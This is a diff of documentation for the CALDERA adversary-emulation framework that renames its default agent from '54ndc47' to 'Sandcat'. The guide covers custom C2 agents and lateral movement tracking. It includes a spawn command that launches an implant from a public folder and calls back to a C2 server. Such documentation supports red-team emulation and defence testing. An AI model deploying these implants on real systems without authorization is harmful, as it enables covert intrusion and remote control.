@@ -1,10 +1,10 @@
 # How to Build Agents
 
 Building your own agent is a way to create a unique - or undetectable - footprint on compromised machines. Our
-default agent, 54ndc47, is a representation of what an agent can do. This agent is written in GoLang and offers
+default agent, Sandcat, is a representation of what an agent can do. This agent is written in GoLang and offers
 an extensible collection of command-and-control (C2) protocols, such as communicating over HTTP or GitHub Gist. 
 
-You can extend 54ndc47 by adding your own C2 protocols in place or you can follow this guide to create your own agent 
+You can extend Sandcat by adding your own C2 protocols in place or you can follow this guide to create your own agent 
 from scratch.
 
 ## Understanding contacts
@@ -140,11 +140,11 @@ Additionally, you may want to take advantage of CALDERA's lateral movement track
 implementation for tracking lateral movement depends on passing the ID of the Link spawning the agent as 
 an argument to the agent's spawn command and upon the agent's check in, for this Link ID to be returned as part of the
 agent's profile. The following section explains how lateral movement tracking has been enabled for the default agent,
-54ndc47.  
+Sandcat.  
 
-### 54ndc47
+### Sandcat
 
-An example 54ndc47 spawn command has been copied from the [Service Creation ability](https://github.com/mitre/stockpile/blob/master/data/abilities/execution/95727b87-175c-4a69-8c7a-a5d82746a753.yml)
+An example Sandcat spawn command has been copied from the [Service Creation ability](https://github.com/mitre/stockpile/blob/master/data/abilities/execution/95727b87-175c-4a69-8c7a-a5d82746a753.yml)
 and included below for reference:
 ```
 C:\Users\Public\s4ndc4t.exe -server #{server} -originLinkID #{origin_link_id}
@@ -154,7 +154,7 @@ the populated command will appear as:
 ```
 C:\Users\Public\s4ndc4t.exe -server http://192.168.0.1:8888 -originLinkID cd63fdbb-0f3a-49ea-b4eb-306a3ff40f81
 ```
-The 54ndc47 agent stores the value of this global variable in its profile, which is then returned to the CALDERA server
+The Sandcat agent stores the value of this global variable in its profile, which is then returned to the CALDERA server
 upon first check-in as a key\value pair `origin_link_id : cd63fdbb-0f3a-49ea-b4eb-306a3ff40f81` in the JSON dictionary. The CALDERA server will 
 automatically store this pair when creating the Agent object and use it when generating the Attack Path graph in the
 Debrief plugin.
